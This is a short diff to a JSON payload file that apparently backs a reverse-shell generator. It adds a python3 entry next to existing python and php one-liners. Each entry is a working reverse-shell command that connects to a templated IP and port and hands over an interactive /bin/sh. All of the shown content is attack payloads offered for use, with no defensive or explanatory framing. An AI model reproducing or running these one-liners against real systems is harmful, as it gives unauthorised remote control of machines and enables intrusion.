@@ -12,6 +12,10 @@
     "code": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{d[ip]}\",{d[port]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
   },
   {
+    "lang": ["python3"],
+    "code": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{d[ip]}\",{d[port]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+  },
+  {
     "lang": ["php"],
     "code": "php -r '$sock=fsockopen(\"{d[ip]}\",{d[port]});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
   },
